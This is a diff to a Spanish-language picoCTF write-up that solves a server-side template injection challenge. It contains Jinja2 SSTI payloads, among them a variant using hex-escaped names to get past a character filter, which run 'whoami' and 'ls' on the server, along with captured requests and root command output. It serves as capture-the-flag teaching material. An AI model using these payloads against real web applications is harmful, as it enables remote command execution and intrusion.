@@ -76,7 +76,7 @@ Developers assume no liability and are not responsible for any misuse or damage 
 
 Al capturar con Zap proxy el request, me doy cuenta de el el request se codifica antes de ser enviado. 
 
-``` html
+``` 
 POST http://shape-facility.picoctf.net:52506/ HTTP/1.1
 Host: shape-facility.picoctf.net:52506
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -99,7 +99,7 @@ Busqué un payload que funcionase con esta vulnerabilidad y encontré lo que me 
 
 [https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-](https://github.com/Jieyab89/Jinja2-python-or-flask-SSTI-vulnerability-payload-)
 
-\{\{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() \}\}
+>\{\{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() \}\}
 
 Sin embargo el la web del formulario al enviar este payload nos envía a una web con el siguente mensaje
 
@@ -112,13 +112,16 @@ Bueno no es la flag pero nos da una pista, si además hacemos caso de las pistas
 Al hacer el request y capturar con Zap nos muestra que hay ciertos caracteres que no se está encodeando.
 
 ``` 
+POST http://shape-facility.picoctf.net:52506/ HTTP/1.1
 Host: shape-facility.picoctf.net:52506
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 192
+Origin: http://shape-facility.picoctf.net:52506
 Connection: keep-alive
+Referer: http://shape-facility.picoctf.net:52506/
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
@@ -140,9 +143,8 @@ Se utiliza cuando se hace uso de Jinja2 en un proyecto de esta forma. Y es la mi
 
 Resultado somos root
 
-```
-uid=0(root) gid=0(root) groups=0(root) 
-```
+> uid=0(root) gid=0(root) groups=0(root) 
+
 Buscamos la flag primero lanzando un ls
 
 \{\{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()\}\}
